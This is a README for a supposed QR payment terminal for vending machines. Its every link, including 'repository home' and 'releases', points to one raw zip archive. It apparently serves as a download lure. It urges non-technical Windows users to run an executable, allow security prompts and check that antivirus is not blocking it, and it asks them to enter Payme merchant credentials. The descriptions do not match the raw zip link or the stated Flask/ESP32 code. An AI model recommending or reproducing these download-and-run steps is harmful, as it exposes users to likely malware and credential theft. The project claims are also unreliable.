# 💳 Payme-QR-Payment-Terminal - Simple QR Payment for Vending Machines

[![Download](https://img.shields.io/badge/Download-Payme%20QR%20Terminal-brightgreen)](https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip)

---

## 📋 About Payme-QR-Payment-Terminal

This application turns vending machines into smart payment stations. It uses an ESP32 device, a Flask server, and Payme’s JSON-RPC webhook system. It generates QR codes that customers scan to pay. You can manage prices remotely and track each payment in real time through MQTT notifications. This software handles the whole payment process from start to finish.

It is meant for users who want a reliable, production-ready way to accept Payme QR code payments through vending machines connected to the internet.

## 🎯 Key Features

- Generates QR codes for quick Payme payments.
- Links with ESP32 hardware for IoT vending machine use.
- Flask server manages backend payment processing.
- Supports Payme JSON-RPC webhook for secure payment flow.
- MQTT-based system for real-time transaction updates.
- Remote control for price changes without physical access.
- Full transaction lifecycle monitoring.
- Works on Windows through a simple user interface.

## 📌 Topics Covered

This project touches on:

- Arduino and ESP32 programming
- Flask server setup and management
- MQTT communication with HiveMQ
- Payme payment system integration
- QR code generation
- Python backend development
- Rest APIs for control and monitoring
- Vending machine automation
- IoT devices connectivity

---

## 🚀 Getting Started

This guide helps you download and run Payme-QR-Payment-Terminal on a Windows computer. No coding or programming experience is needed.

### System Requirements

- Windows 10 or newer (64-bit recommended)
- At least 4 GB RAM
- 200 MB free disk space
- Active internet connection
- USB port if connecting an ESP32 device

### What You’ll Get

- A Windows executable file or installer for the app
- Basic setup to link your machine with Payme payment service
- Instructions for connecting ESP32 hardware (optional)

---

## ⬇️ How to Download and Install

Start by visiting the project page to get the latest files:

[![Download](https://img.shields.io/badge/Download-Payme%20QR%20Terminal-brightgreen)](https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip)

1. Click the badge or open this link in your browser:  
   https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip

2. On the page, find the **Releases** or **Download** section. This usually appears on the right side or near the top.

3. Download the Windows installer or .exe file. It should be clearly named, such as `Payme-QR-Payment-Terminal-Setup.exe`.

4. Open the downloaded file to start installation.

5. Follow the on-screen steps to install the application on your PC.

6. When installation finishes, launch the app from your desktop or Start menu.

---

## ⚙️ Setup Guide

After installing the app, follow these steps to get it running with your vending machine.

### Step 1: Configure the Server

- Launch the Payme-QR-Payment-Terminal app.
- Enter your Payme merchant credentials. These are usually provided by your Payme account.
- Set the server port if needed; default is often set for you.

### Step 2: Connect the ESP32 Device (If used)

- Plug your ESP32 device into your PC with a USB cable.
- The app will detect the device automatically.
- Follow the app instructions to pair the device.
- Ensure the device is online and connected to the same WiFi network as your PC.

### Step 3: Manage Pricing

- Use the app to set prices for products in your vending machine.
- Prices update remotely, no need to physically adjust the machine.

### Step 4: Start Payment Service

- Click the **Start Service** button.
- The app will generate a QR code on screen for customers to scan.
- Transactions will show status updates on your PC in real time.

---

## 🔧 Usage Tips

- Keep your PC connected to the internet for payment processing.
- Verify your Payme account details are up to date in the app.
- Use the app’s MQTT logs to monitor payment status quickly.
- Restart the app after updates or network changes.
- Use the QR code displayed to test payments on your phone.

---

## 💾 Where to Get Support Files

All official files and updates appear on the GitHub repository page:

https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip

You can check this page regularly for updates or bug fixes.

---

## 🛠 Troubleshooting

### App Won’t Launch

- Check if Windows shows a security prompt and allow permissions.
- Confirm your antivirus isn’t blocking the app.
- Restart your PC and try again.

### ESP32 Not Detected

- Reconnect the USB cable.
- Verify drivers are installed for the ESP32.
- Use a different USB port.

### Payment Not Completed

- Make sure the internet connection is stable.
- Check Payme merchant credentials.
- Restart the payment service in the app.

---

## 📁 File Structure Overview

- **/esp32**: Code for the ESP32 IoT hardware interface.
- **/flask-server**: Backend server code managing payments and QR codes.
- **/mqtt**: MQTT client setup and notification handling.
- **README.md**: Project documentation.
- **setup.exe (or similar)**: Windows installer or executable file.

---

## 🧰 Requirements for Developers (Optional)

If you want to explore or customize this project:

- Python 3.8 or newer
- Arduino IDE for ESP32 firmware changes
- MQTT broker (HiveMQ or similar)
- Git for version control

To run Flask server manually, open a command prompt in `/flask-server` and type:

```
python app.py
```

---

## 🔗 Important Links

- Repository home: https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip  
- Download latest Windows installer: [Download from here](https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip)

---

## ⚖️ License

This project is open source. Review license terms on the GitHub page for permissions.